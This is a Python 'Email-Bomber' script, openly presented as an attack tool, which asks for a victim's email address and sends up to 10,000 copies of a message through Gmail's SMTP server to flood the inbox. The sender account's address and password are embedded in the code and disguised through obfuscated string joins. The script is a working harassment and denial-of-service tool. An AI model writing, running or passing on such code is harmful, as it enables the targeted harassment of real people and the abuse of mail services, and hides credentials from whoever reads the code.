import smtplib
import sys
import os

class bcolors:
    GREEN='\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[34m'
    Syellow='\33[105m'
    MAGENTA = '\033[35m'
    UNDERLINE = '\033[4m'




def banner():
    print(bcolors.MAGENTA+ '            +++##########[_Email-Bomber_]##########---')
    print(bcolors.MAGENTA+ '            +++########[Lets_do_it_for_fun]########---]')
    print(bcolors.YELLOW+  '''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 
||----------------------[__) _ ._ _ |_  _ ._.,-------------------||
||____________________|_[__)(_)[ | )[_)(/,[__ ___________________||             
||                   \|/                                         ||
||                    |                                          ||
||                    "                                          ||
||                     "                                         ||
||                       "--+--"                                 ||   ''')
    print(bcolors.GREEN+'''||                          |                                    ||
||                      ,--'#`--.                                ||
||                      |#######|                                ||
||                   _.-'#######`-._                             ||
||                 ,-'###############`-.                         ||
||               ,'#####################`,                       ||
||              |#########################|                      ||
||             |###########################|                     ||
||            |#############################|                    || 
||            |#############################|                    ||
||            |#############################|                    ||
||             |###########################|                     ||
||              \#########################/                      ||
||               `,######################,'                      ||
||                `._################_,'                         ||
||                   `--..#######..--'                           ||
|||_____________________________________________________________|||
|||_____________________________________________________________|||      ''')

    print(bcolors.BLUE + '''||                         ,.___     .__         .               ||
||                        |[__ ._ _ [__) _ ._ _ |_  _ ._.        ||
||                        |[___[ | )[__)(_)[ | )[_)(/,[          ||
||                                                               ||
||                                                               ||
|||_____________________________________________________________|||  ''')
    print(bcolors.RED+'''||                                     __________________________||      
||                                     ||Author:@_Specter_Dhanush||
||                                     ||helped by:@spectertraww ||
||                                     --------------------------||
|| _____________________________________________________________|||                                         
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||      ''')



class Email_Bomber:
    count=0

    def inpu(self):

      try:
        ame =input(bcolors.YELLOW+"<<## Enter your name ##<<: ")
        self.name=ame.upper()
        print(bcolors.YELLOW+'...###+[Resourcing the program]-###...')
        self.target=str(input(bcolors.YELLOW+self.name+" can you enter the victim email (including @gmail.com)<<: "))

      except Exception as e:
        print(f'ERROR: {e}')



    def attack1(self):
        try:
            ak1 = 'pm'
            ak2 = 'so'
            ak4 = 'c.'
            ak5 = 'ol'
            ak3 = 'yc'
            ak6 = 'gi'
            ak7 = 'ha'
            ak8 = 'om'
            nam = 'vi'
            name2 = 'a0'
            name3 = nam.join(name2)
            name4 = 'g1'
            name5 = name3.join(name4)
            name6 = 'a0'

            ak9 = 'sg'
            ak10 = 't2001@'
            a1 = ak10.join(ak9)
            a2 = a1.join(ak8)
            a3 = a2.join(ak7)
            a4 = a3.join(ak6)
            a5 = a4.join(ak5)
            a6 = a5.join(ak4)
            a7 = a6.join(ak3)
            a8 = a7.join(ak2)
            a9 = a8.join(ak1)

            self.attacker = str(a9)

            name7 = name5.join(name6)
            name8 = 'r9'
            name9 = name7.join(name8)
            self.attackerps=str(name9)
        except Exception as e:
            print(f'ERROR: {e}')

    def inpue(self):
      try:
        self.num=int(input(bcolors.BLUE+self.name+ " can you select the amount of messages from (1-10000)<<: "))
        self.message = str(input(bcolors.BLUE+self.name + ' can you enter  message <<: '))
      except Exception as e:
        print(f'ERROR: {e}')



    def email(self):

        try:
            self.port = int(587)
            self.server = 'smtp.gmail.com'
            self.fromAddr = self.attacker
            self.fromPwd = self.attackerps
            self.subject = str(input(bcolors.GREEN + '<<## Enter subject ##<<: '))


            self.message =self.message

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target,self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
      try:
        print(bcolors.YELLOW + '\n+++[## Attacking ## ,we are now attacking the victim ]... ___')
        for email in range(self.num +1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+++[## Attack finished ##]___')
        sys.exit(0)
      except Exception as e:
            print(f'ERROR: {e}')


def funbomb():
    banner()
    bomb1 =Email_Bomber()
    bomb1.inpu()
    bomb1.attack1()
    bomb1.inpue()
    bomb1.email()
    bomb1.attack()

funbomb()









